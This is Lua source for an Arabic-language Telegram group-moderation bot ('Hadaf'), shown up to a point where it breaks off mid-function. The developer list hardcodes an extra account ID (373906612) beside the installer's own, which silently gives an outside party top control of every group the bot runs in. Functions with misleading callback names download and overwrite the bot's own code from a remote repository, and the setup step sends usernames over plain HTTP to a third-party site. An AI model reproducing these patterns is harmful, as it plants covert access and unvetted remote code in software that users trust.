http = require("socket.http")
https = require("ssl.https")
JSON = dofile("./lib/dkjson.lua")
json = dofile("./lib/JSON.lua")
URL = dofile("./lib/url.lua")
serpent = dofile("./lib/serpent.lua")
redis = dofile("./lib/redis.lua").connect("127.0.0.1", 6379)
Server_DevHadaf = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
------------------------------------------------------------------------------------------------------------
local function Load_File()
local f = io.open("./Info_Sudo.lua", "r")  
if not f then   
if not redis:get(Server_DevHadaf.."Token_DevHadaf") then
io.write('\n\27[1;35m⬇┇Send Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m🔄┇Token Is Communication Error\n التوكن غلط جرب مره اخرى \n\27[0;39;49m')
else
io.write('\n\27[1;31m✅┇Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
redis:set(Server_DevHadaf.."Token_DevHadaf",token)
end 
else
io.write('\n\27[1;31m🔄┇Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua Hadaf.lua')
end
------------------------------------------------------------------------------------------------------------
if not redis:get(Server_DevHadaf.."User_DevHadaf1") then
io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = http.request("http://teamstorm.tk/GetUser?id="..User_Sudo)
local User_Info = JSON.decode(GetInfoUser)
if User_Info.Info.Chek == "Not_Info" then
io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
os.execute('lua Hadaf.lua')
end
if User_Info.Info.Chek == "Is_Spam" then
io.write('\n\27[1;31m🔄┇Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
os.execute('lua Hadaf.lua')
end
if User_Info.Info == 'Channel' then
io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرًا هذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua Hadaf.lua')
end
io.write('\n\27[1;31m✅┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
redis:set(Server_DevHadaf.."User_DevHadaf1",User_Info.Info.Username)
redis:set(Server_DevHadaf.."Id_DevHadaf",User_Info.Info.Id)
else
io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
end 
os.execute('lua Hadaf.lua')
end
------------------------------------------------------------------------------------------------------------
local DevHadaf_Info_Sudo = io.open("Info_Sudo.lua", 'w')
DevHadaf_Info_Sudo:write([[
do 
local Hadaf_INFO = {
Id_DevHadaf = ]]..redis:get(Server_DevHadaf.."Id_DevHadaf")..[[,
UserName_Hadaf = "]]..redis:get(Server_DevHadaf.."User_DevHadaf1")..[[",
Token_Bot = "]]..redis:get(Server_DevHadaf.."Token_DevHadaf")..[["
}
return Hadaf_INFO
end

]])
DevHadaf_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_Hadaf = io.open("Hadaf", 'w')
Run_File_Hadaf:write([[
#!/usr/bin/env bash
cd $HOME/Hadaf
token="]]..redis:get(Server_DevHadaf.."Token_DevHadaf")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Hadaf.lua -p PROFILE --bot=$token
done
]])
Run_File_Hadaf:close()
------------------------------------------------------------------------------------------------------------
local Run_SM = io.open("Run", 'w')
Run_SM:write([[
#!/usr/bin/env bash
cd $HOME/Hadaf
while(true) do
rm -fr ../.telegram-cli
screen -S DevHadaf -X kill
screen -S DevHadaf ./Hadaf
done
]])
Run_SM:close()
os.execute('chmod +x tg')
os.execute('chmod +x Run')
os.execute('chmod +x Hadaf')
os.execute('./Run')
Status = true
else   
f:close()  
redis:del(Server_DevHadaf.."Token_DevHadaf");redis:del(Server_DevHadaf.."Id_DevHadaf");redis:del(Server_DevHadaf.."User_DevHadaf1")
Status = false
end  
return Status
end
Load_File()
------------------------------------------------------------------------------------------------------------
sudos = dofile("./Info_Sudo.lua")
token = sudos.Token_Bot
UserName_Dev = sudos.UserName_Hadaf
bot_id = token:match("(%d+)")  
Id_Dev = sudos.Id_DevHadaf
Ids_Dev = {sudos.Id_DevHadaf,373906612}
Name_Bot = (redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف")
------------------------------------------------------------------------------------------------------------
function var(value)  
print(serpent.block(value, {comment=false}))   
end 
function dl_cb(arg,data)
-- var(data)  
end
------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------
function Rank_Checking(user_id,chat_id)
if Dev_Hadaf_User(user_id) then
Status = true  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = true  
elseif redis:sismember(bot_id.."Hadaf:Developer:Bot", user_id) then
Status = true  
elseif redis:sismember(bot_id.."Hadaf:President:Group"..chat_id, user_id) then
Status = true
elseif redis:sismember(bot_id..'Hadaf:Constructor:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Hadaf:Manager:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Hadaf:Admin:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Hadaf:Vip:Group'..chat_id, user_id) then  
Status = true  
else  
Status = false  
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function Get_Rank(user_id,chat_id)
if Dev_Hadaf_User(user_id) == true then
Status = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = "البوت"
elseif redis:sismember(bot_id.."Hadaf:Developer:Bot", user_id) then
Status = redis:get(bot_id.."Hadaf:Developer:Bot:Reply"..chat_id) or "المطور"  
elseif redis:sismember(bot_id.."Hadaf:President:Group"..chat_id, user_id) then
Status = redis:get(bot_id.."Hadaf:President:Group:Reply"..chat_id) or "المنشئ اساسي"
elseif redis:sismember(bot_id..'Hadaf:Constructor:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Hadaf:Constructor:Group:Reply"..chat_id) or "المنشئ"  
elseif redis:sismember(bot_id..'Hadaf:Manager:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Hadaf:Manager:Group:Reply"..chat_id) or "المدير"  
elseif redis:sismember(bot_id..'Hadaf:Admin:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Hadaf:Admin:Group:Reply"..chat_id) or "الادمن"  
elseif redis:sismember(bot_id..'Hadaf:Vip:Group'..chat_id, user_id) then  
Status = redis:get(bot_id.."Hadaf:Vip:Group:Reply"..chat_id) or "المميز"  
else  
Status = redis:get(bot_id.."Hadaf:Mempar:Group:Reply"..chat_id) or "العضو"
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function ChekBotAdd(chat_id)
if redis:sismember(bot_id.."Hadaf:ChekBotAdd",chat_id) then
Status = true
else 
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function MutedGroups(Chat_id,User_id) 
if redis:sismember(bot_id.."Hadaf:Silence:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function RemovalUserGroup(Chat_id,User_id) 
if redis:sismember(bot_id.."Hadaf:Removal:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end 
------------------------------------------------------------------------------------------------------------
function RemovalUserGroups(User_id) 
if redis:sismember(bot_id.."Hadaf:Removal:User:Groups",User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
------------------------------------------------------------------------------------------------------------
function Delete_Message(chat,id)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil))
end
------------------------------------------------------------------------------------------------------------
function DeleteMessage_(chat,id,func)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
------------------------------------------------------------------------------------------------------------
function Get_Api(Info_Web) 
local Info, Res = https.request(Info_Web) 
local Req = json:decode(Info) 
if Res ~= 200 then 
return false 
end 
if not Req.ok then 
return false 
end 
return Req 
end 
------------------------------------------------------------------------------------------------------------
function sendText(chat_id, text, reply_to_message_id, markdown) 
Status_Api = "https://api.telegram.org/bot"..token 
local Url_Api = Status_Api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
Url_Api = Url_Api .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
Url_Api = Url_Api.."&parse_mode=Markdown" 
elseif markdown == "html" then 
Url_Api = Url_Api.."&parse_mode=HTML" 
end 
return Get_Api(Url_Api)  
end
------------------------------------------------------------------------------------------------------------
function send_inline_keyboard(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local Status_Api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
Status_Api = Status_Api.."&reply_to_message_id="..reply_id 
end 
return Get_Api(Status_Api) 
end
------------------------------------------------------------------------------------------------------------
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function sendPhoto(chat_id,reply_id,photo,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendVoice(chat_id,reply_id,voice,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAnimation(chat_id,reply_id,animation,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAudio(chat_id,reply_id,audio,title,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendSticker(chat_id,reply_id,sticker,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/Hadafsource/Hadaf/master/Script.lua'
file_path = 'Script.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end
------------------------------------------------------------------------------------------------------------ 
function tdcli_update_callback_value_(Data) 
tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/Hadafsource/Hadaf/master/Hadaf.lua'
file_path = 'Hadaf.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
------------------------------------------------------------------------------------------------------------
function sendVideo(chat_id,reply_id,video,caption,func)
pcall(tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo",  
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendDocument(chat_id,reply_id,document,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function KickGroup(chat,user)
pcall(tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil))
end
------------------------------------------------------------------------------------------------------------
function Send_Options(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "i3mrz")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "Close_Status" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."")
return false
end
if status == "Close_Status_Ktm" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n⚠️️┇خاصية ← الكتم\n")
return false
end
if status == "Close_Status_Kick" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n⚠️️┇خاصية ← الطرد\n")
return false
end
if status == "Close_Status_Kid" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n⚠️️┇خاصية ← التقييد\n")
return false
end
if status == "Open_Status" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,"👨🏻‍✈️┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"⚠️┇ لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
function Send_Optionspv(chat,idmsg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "i3mrz")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "reply_Pv" then
send(chat,idmsg,"👨🏻‍✈️┇المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(chat,idmsg,"⚠️┇ لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
------------------------------------------------------------------------------------------------------------
function Total_message(Message)  
local MsgText = ''  
if tonumber(Message) < 100 then 
MsgText = 'تفاعلك ضعيف جدًا 🌸' 
elseif tonumber(Message) < 200 then 
MsgText = 'تفاعلك ضعيف 🌼'
elseif tonumber(Message) < 400 then 
MsgText = 'تفاعل متوسط 🦋' 
elseif tonumber(Message) < 700 then 
MsgText = 'تفاعلك ممتاز ☁️' 
elseif tonumber(Message) < 1200 then 
MsgText = 'لانتخلى عن تفاعلك ✨' 
elseif tonumber(Message) < 2000 then 
MsgText = 'قمة التفاعل 💠' 
elseif tonumber(Message) < 3500 then 
MsgText = 'عطاء جيد ⛄ ️'  
elseif tonumber(Message) < 4000 then 
MsgText = 'عطاء ممتاز 🌿' 
elseif tonumber(Message) < 4500 then 
MsgText = 'عطاءك رائع 🧡' 
elseif tonumber(Message) < 5500 then 
MsgText = 'قمة العطاء ☁️' 
elseif tonumber(Message) < 7000 then 
MsgText = 'تفاعلك بالقمة 🍀' 
elseif tonumber(Message) < 9500 then 
MsgText = 'بتفاعلك نسمو 🌟' 
elseif tonumber(Message) < 10000000000 then 
MsgText = 'عطاءك لاينتهي 🔥'  
end 
return MsgText 
end
------------------------------------------------------------------------------------------------------------
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
------------------------------------------------------------------------------------------------------------
function NotSpam(msg,Type)
if Type == "kick" then 
Send_Options(msg,msg.sender_user_id_,"reply","⚠️️┇قام بالتكرار هنا وتم طرده")  
KickGroup(msg.chat_id_,msg.sender_user_id_) 
return false  
end 
if Type == "del" then 
Delete_Message(msg.chat_id_,{[0] = msg.id_})    
return false
end 
if Type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
Send_Options(msg,msg.sender_user_id_,"reply","⚠️️┇قام بالتكرار هنا وتم تقييده")  
return false  
end  
if Type == "mute" then
Send_Options(msg,msg.sender_user_id_,"reply","⚠️️┇قام بالتكرار هنا وتم كتمه")  
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
return false  
end
end  
------------------------------------------------------------------------------------------------------------

function SetFile_Groups(msg,chat,File_id,JsonFile)
if JsonFile and not JsonFile:match('.json') then
send(chat,msg.id_,"*⚠️┇عذرًا الملف ليس بصيغة ال : Json*")
return false
end
if tonumber(JsonFile:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_,"⚠️┇الملف لا يتوافق مع البوت يرجى رفع ملف نسخة القروبات الحقيفي")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..File_id) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,''..JsonFile) 
send(chat,msg.id_,"⚠️️┇جاري بدء رفع القروبات وتحويل الخزن ...")   
local Get_Info = io.open('./'..bot_id..'Hadaf:.json', "r"):read('*a')
local JsonInfo = JSON.decode(Get_Info)
var(JsonInfo)  
for Id_Group,Info_Group in pairs(JsonInfo.Groups) do
redis:set(bot_id.."Hadaf:Lock:tagservrbot"..Id_Group,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,v in pairs(list) do
redis:set(bot_id..v..Id_Group,"del")
end
redis:sadd(bot_id.."Hadaf:ChekBotAdd",Id_Group)
if Info_Group.President then
for k,Id_President in pairs(Info_Group.President) do
redis:sadd(bot_id.."Hadaf:President:Group"..Id_Group,Id_President)
end
end
if Info_Group.Constructor then
for k,Id_Constructor in pairs(Info_Group.Constructor) do
redis:sadd(bot_id.."Hadaf:Constructor:Group"..Id_Group,Id_Constructor)  
end
end
if Info_Group.Manager then
for k,Id_Manager in pairs(Info_Group.Manager) do
redis:sadd(bot_id.."Hadaf:Manager:Group"..Id_Group,Id_Manager)  
end
end
if Info_Group.Admin then
for k,Id_Admin in pairs(Info_Group.Admin) do
redis:sadd(bot_id.."Hadaf:Admin:Group"..Id_Group,Id_Admin)  
end
end
if Info_Group.Vips then
for k,Id_Vips in pairs(Info_Group.Vips) do
redis:sadd(bot_id.."Hadaf:Vip:Group"..Id_Group,Id_Vips)  
end
end
if Info_Group.WelcomeGroup then
if Info_Group.WelcomeGroup ~= "" then
redis:set(bot_id.."Hadaf:Get:Welcome:Group"..Id_Group,Info_Group.WelcomeGroup)   
end
end
if Info_Group.Status_Dev then
if Info_Group.Status_Dev ~= "" then
redis:set(bot_id.."Hadaf:Developer:Bot:Reply"..Id_Group,Info_Group.Status_Dev)   
end
end
if Info_Group.Status_Prt then
if Info_Group.Status_Prt ~= "" then
redis:set(bot_id.."Hadaf:President:Group:Reply"..Id_Group,Info_Group.Status_Prt)   
end
end
if Info_Group.Status_Cto then
if Info_Group.Status_Cto ~= "" then
redis:set(bot_id.."Hadaf:Constructor:Group:Reply"..Id_Group,Info_Group.Status_Cto)   
end
end
if Info_Group.Status_Own then
if Info_Group.Status_Own ~= "" then
redis:set(bot_id.."Hadaf:Manager:Group:Reply"..Id_Group,Info_Group.Status_Own)   
end
end
if Info_Group.Status_Md then
if Info_Group.Status_Md ~= "" then
redis:set(bot_id.."Hadaf:Admin:Group:Reply"..Id_Group,Info_Group.Status_Md)   
end
end
if Info_Group.Status_Vip then
if Info_Group.Status_Vip ~= "" then
redis:set(bot_id.."Hadaf:Vip:Group:Reply"..Id_Group,Info_Group.Status_Vip)   
end
end
if Info_Group.Status_Mem then
if Info_Group.Status_Mem ~= "" then
redis:set(bot_id.."Hadaf:Mempar:Group:Reply"..Id_Group,Info_Group.Status_Mem)   
end
end
if Info_Group.LinkGroup then
if Info_Group.LinkGroup ~= "" then
redis:set(bot_id.."Hadaf:link:set:Group"..Id_Group,Info_Group.LinkGroup)   
end
end
end
send(chat,msg.id_,"✅┇تم رفع ملف الخزن بنجاح\n⚠️┇تم استرجاع جميع القروبات ورفع المنشئين والمدراء في البوت")   
end
function Dev_Hadaf(msg)  
local Dev_Hadaf = false  
for k,v in pairs(Ids_Dev) do  
if msg.sender_user_id_ == v then  
Dev_Hadaf = true  
end  
end  
return Dev_Hadaf  
end 
function Bot(msg)  
local idbot = false  
if msg.sender_user_id_ == bot_id then  
idbot = true  
end  
return idbot  
end 
function Dev_Hadaf_User(user)  
local Dev_Hadaf_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Hadaf_User = true  
end  
end  
return Dev_Hadaf_User  
end 
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Hadaf:Developer:Bot", msg.sender_user_id_) 
if Status or Dev_Hadaf(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
function PresidentGroup(msg)
local hash = redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or Bot(msg) then  
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Admin(msg)
local hash = redis:sismember(bot_id..'Hadaf:Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember(bot_id..'Hadaf:Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then     
return true 
else 
return false 
end 
end
------------------------------------------------------------------------------------------------------------
function Dev_Hadaf_File(msg,data)
if msg then
function Dev_Hadaf(msg)  
local Dev_Hadaf = false  
for k,v in pairs(Ids_Dev) do  
if msg.sender_user_id_ == v then  
Dev_Hadaf = true  
end  
end  
return Dev_Hadaf  
end 
function Bot(msg)  
local idbot = false  
if msg.sender_user_id_ == bot_id then  
idbot = true  
end  
return idbot  
end 
function Dev_Hadaf_User(user)  
local Dev_Hadaf_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Hadaf_User = true  
end  
end  
return Dev_Hadaf_User  
end 
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Hadaf:Developer:Bot", msg.sender_user_id_) 
if Status or Dev_Hadaf(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
function PresidentGroup(msg)
local hash = redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or Bot(msg) then  
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Admin(msg)
local hash = redis:sismember(bot_id..'Hadaf:Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember(bot_id..'Hadaf:Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
if hash or Dev_Hadaf(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then     
return true 
else 
return false 
end 
end
msg = data.message_
text = msg.content_.text_
------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
redis:incr(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) 
TypeForChat = 'ForSuppur' 
elseif id:match("^(%d+)") then
redis:sadd(bot_id..'Hadaf:Num:User:Pv',msg.sender_user_id_)  
TypeForChat = 'ForUser' 
else
TypeForChat = 'ForGroup' 
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Hadaf:Lock:text"..msg.chat_id_) and not Vips(msg) then       
Delete_Message(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
redis:incr(bot_id.."Hadaf:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if redis:get(bot_id.."Hadaf:Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
KickGroup(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if redis:get(bot_id.."Hadaf:Lock:Join"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if redis:get(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
